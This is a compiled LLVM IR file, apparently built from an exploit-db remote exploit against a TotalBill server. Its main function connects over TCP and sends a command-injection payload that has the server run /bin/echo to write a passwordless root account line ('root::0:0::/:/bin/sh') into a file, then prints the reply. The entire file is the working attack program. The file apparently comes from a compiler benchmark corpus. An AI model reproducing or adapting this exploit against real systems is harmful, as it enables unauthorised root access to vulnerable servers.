; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20145.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20145.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32* }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [38 x i8] c"Error: Could not create a socket: %s\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@TOTALBILL_PORT = common dso_local global i32 0, align 4
@TOTALBILL_SERVER = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [29 x i8] c"Error: Could not look up %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"Error: Cannot connect to %s: %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [77 x i8] c"123456  execute  execute  execute=/bin/echo+root::0:0::/:/bin/sh+>+/rootfile\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"Sending command %s to %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [35 x i8] c"Error: Cannot write to socket: %s\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c"Sent...waiting for response...\0A\00", align 1
@.str.7 = private unnamed_addr constant [36 x i8] c"Error: Cannot read from socket: %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"Received %s from server\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i8*, align 8
  %4 = alloca [8192 x i8], align 16
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @AF_INET, align 4
  %8 = load i32, i32* @SOCK_STREAM, align 4
  %9 = load i32, i32* @IPPROTO_TCP, align 4
  %10 = call i32 @socket(i32 %7, i32 %8, i32 %9)
  store i32 %10, i32* %6, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %17

12:                                               ; preds = %0
  %13 = load i32, i32* @stderr, align 4
  %14 = load i32, i32* @errno, align 4
  %15 = call i8* @strerror(i32 %14)
  %16 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0), i8* %15)
  store i32 1, i32* %1, align 4
  br label %84

17:                                               ; preds = %0
  %18 = call i32 @memset(%struct.sockaddr_in* %2, i32 0, i32 12)
  %19 = load i32, i32* @AF_INET, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 2
  store i32 %19, i32* %20, align 4
  %21 = load i32, i32* @TOTALBILL_PORT, align 4
  %22 = call i32 @htons(i32 %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 1
  store i32 %22, i32* %23, align 4
  %24 = load i8*, i8** @TOTALBILL_SERVER, align 8
  %25 = call %struct.hostent* @gethostbyname(i8* %24)
  store %struct.hostent* %25, %struct.hostent** %5, align 8
  %26 = icmp eq %struct.hostent* %25, null
  br i1 %26, label %27, label %31

27:                                               ; preds = %17
  %28 = load i32, i32* @stderr, align 4
  %29 = load i8*, i8** @TOTALBILL_SERVER, align 8
  %30 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i8* %29)
  store i32 1, i32* %1, align 4
  br label %84

31:                                               ; preds = %17
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i32 0, i32 0
  %33 = load %struct.hostent*, %struct.hostent** %5, align 8
  %34 = getelementptr inbounds %struct.hostent, %struct.hostent* %33, i32 0, i32 1
  %35 = load i32*, i32** %34, align 8
  %36 = getelementptr inbounds i32, i32* %35, i64 0
  %37 = load i32, i32* %36, align 4
  %38 = load %struct.hostent*, %struct.hostent** %5, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 8
  %41 = call i32 @memcpy(i32* %32, i32 %37, i32 %40)
  %42 = load i32, i32* %6, align 4
  %43 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %44 = call i64 @connect(i32 %42, %struct.sockaddr* %43, i32 12)
  %45 = icmp slt i64 %44, 0
  br i1 %45, label %46, label %52

46:                                               ; preds = %31
  %47 = load i32, i32* @stderr, align 4
  %48 = load i8*, i8** @TOTALBILL_SERVER, align 8
  %49 = load i32, i32* @errno, align 4
  %50 = call i8* @strerror(i32 %49)
  %51 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %47, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i8* %48, i8* %50)
  store i32 1, i32* %1, align 4
  br label %84

52:                                               ; preds = %31
  store i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.3, i64 0, i64 0), i8** %3, align 8
  %53 = load i8*, i8** %3, align 8
  %54 = load i8*, i8** @TOTALBILL_SERVER, align 8
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %53, i8* %54)
  %56 = load i32, i32* %6, align 4
  %57 = load i8*, i8** %3, align 8
  %58 = load i8*, i8** %3, align 8
  %59 = call i64 @strlen(i8* %58)
  %60 = add nsw i64 %59, 1
  %61 = call i64 @write(i32 %56, i8* %57, i64 %60)
  %62 = icmp slt i64 %61, 0
  br i1 %62, label %63, label %68

63:                                               ; preds = %52
  %64 = load i32, i32* @stderr, align 4
  %65 = load i32, i32* @errno, align 4
  %66 = call i8* @strerror(i32 %65)
  %67 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %64, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0), i8* %66)
  store i32 1, i32* %1, align 4
  br label %84

68:                                               ; preds = %52
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0))
  %70 = load i32, i32* %6, align 4
  %71 = getelementptr inbounds [8192 x i8], [8192 x i8]* %4, i64 0, i64 0
  %72 = call i64 @read(i32 %70, i8* %71, i32 8192)
  %73 = icmp slt i64 %72, 0
  br i1 %73, label %74, label %79

74:                                               ; preds = %68
  %75 = load i32, i32* @stderr, align 4
  %76 = load i32, i32* @errno, align 4
  %77 = call i8* @strerror(i32 %76)
  %78 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.7, i64 0, i64 0), i8* %77)
  store i32 1, i32* %1, align 4
  br label %84

79:                                               ; preds = %68
  %80 = getelementptr inbounds [8192 x i8], [8192 x i8]* %4, i64 0, i64 0
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i8* %80)
  %82 = load i32, i32* %6, align 4
  %83 = call i32 @close(i32 %82)
  store i32 0, i32* %1, align 4
  br label %84

84:                                               ; preds = %79, %74, %63, %46, %27, %12
  %85 = load i32, i32* %1, align 4
  ret i32 %85
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #1

declare dso_local i8* @strerror(i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @write(i32, i8*, i64) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
